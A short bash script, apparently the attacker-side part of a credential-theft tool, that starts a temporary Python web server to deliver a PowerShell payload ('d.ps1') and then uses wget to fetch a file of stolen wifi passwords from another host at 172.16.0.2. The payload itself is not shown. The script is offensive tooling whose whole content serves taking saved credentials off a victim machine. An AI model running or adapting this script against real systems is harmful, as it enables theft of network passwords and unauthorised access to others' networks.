#!/bin/bash

# This script has been developed by Ernest Anguera and Isaac Leon

# We create a "web server" with python3 to download the d.ps1 file
timeout 10 python3 -m http.server 8921

# Downloads the file that contains all wifi passwords
wget http://172.16.0.2:8213/wifipass.txt
